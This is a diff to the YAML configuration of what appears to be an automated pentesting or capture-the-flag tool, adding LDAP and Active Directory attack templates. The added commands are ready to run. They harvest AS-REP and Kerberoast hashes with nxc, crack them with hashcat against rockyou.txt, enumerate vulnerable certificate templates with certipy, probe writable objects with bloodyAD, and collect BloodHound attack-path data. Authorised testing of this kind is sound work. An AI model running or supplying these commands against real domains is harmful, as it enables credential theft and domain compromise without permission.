@@ -39,6 +39,61 @@ dns:
         - "dig axfr @{{ip}} {{domain}}"
 
 # ---------------------------------------------------------------------------
+# LDAP / Active Directory (port 389) — hybrid: Python picks the variant
+# (cred > anon > none) and weaves the faketime prefix in via {{ft}}.
+# ---------------------------------------------------------------------------
+ldap:
+  variants:
+    auth:
+      - description: "LDAP AD enumeration (auth)"
+        delay: 7
+        run:
+          - "{{ft}}bloodyAD --host {{dc_fqdn}} -d {{domain}} -u '{{user}}' -p '{{password}}' -k get writable"
+          - "echo"
+          - "rm -f $(pwd)/hashes.kerberoast"
+          - "{{ft}}nxc ldap {{ip}} -u '{{user}}' -p '{{password}}' -k --pass-pol --pso --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa"
+          - "{{ft}}nxc ldap {{ip}} -u '{{user}}' -p '{{password}}' -k -M maq -M sccm -M laps -M adcs -M pre2k -M badsuccessor -M dns-nonsecure -M dump-computers -M get-network -M obsolete"
+          - "echo"
+          - "hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet"
+          - "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
+          - "hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
+      - description: "Certificate enumeration (auth)"
+        delay: 7
+        run:
+          - "rm -f $(pwd)/initial_enabled_Certipy.json"
+          - "{{ft}}certipy find -u '{{user}}'@{{domain}} -p '{{password}}' -k -target {{dc_fqdn}} -dc-ip {{ip}} -stdout -json -output initial_enabled -timeout 2 -enabled"
+          # Literal block scalar: keeps the backslash-n literal (double-quoted
+          # YAML would turn \n into a real newline and break the command).
+          - |-
+            echo -e '\n<--- Find Vulnerable: --->\n'
+          - "{{ft}}certipy find -u '{{user}}'@{{domain}} -p '{{password}}' -k -target {{dc_fqdn}} -dc-ip {{ip}} -stdout -timeout 2 -vulnerable"
+          - "echo"
+          - "parse_certipy.py initial_enabled_Certipy.json"
+          - "echo"
+          - "{{ft}}powerview {{domain}}/'{{user}}':'{{password}}'@{{dc_fqdn}} -k --web --no-cache"
+      - description: "Start BloodHound"
+        delay: 2
+        run:
+          - "bloodhound-cli up"
+          - "sleep 1"
+          - "echo"
+          - "{{ft}}bloodhound-ce-python --zip -c All -d {{domain}} -dc {{dc_fqdn}} -ns {{ip}} -u '{{user}}' -p '{{password}}' -op ia && bloodhound-ce-ctl -u http://127.0.0.1:8081 -c -p -z $(ls -t ia_*_bloodhound.zip | head -n1)"
+    anon:
+      - description: "LDAP anonymous enumeration"
+        delay: 7
+        run:
+          - "rm -f $(pwd)/hashes.kerberoast"
+          - "nxc ldap {{dc_fqdn}} -u '' -p '' --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa"
+          - "echo"
+          - "hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet"
+          - "hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
+          - "hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet"
+      - description: "PowerView anonymous"
+        delay: 2
+        run:
+          - "powerview {{dc_fqdn}} --no-cache"
+
+# ---------------------------------------------------------------------------
 # SMB (port 445) — hybrid: variant chosen in Python, per-share loop in Python,
 # command text lives here.
 # ---------------------------------------------------------------------------
